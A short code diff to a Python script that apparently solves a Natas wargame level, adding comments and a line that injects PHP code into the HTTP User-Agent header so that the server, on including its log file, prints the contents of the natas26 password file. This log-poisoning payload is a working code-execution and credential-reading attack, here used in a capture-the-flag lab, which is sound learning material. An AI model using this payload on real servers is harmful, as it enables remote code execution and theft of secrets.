@@ -99,4 +99,8 @@ print(f'{div_content}\n')
 # so, what we can do is to modify the HTTP USER AGENT header 
 # to contain PHP code and let the webserver executes it when 
 # it loads the log file and sends it to our browser
-print(f'{session.headers}')
+print(f'{session.headers}\n')
+# update the http user agent in the request headers
+# it includes the php code that will display the content of natas26 password file
+# the code will then be executed by the server before returned back to the browser
+session.headers['User-Agent'] = "<? echo file_get_contents('/etc/natas_webpass/natas26') ?>"
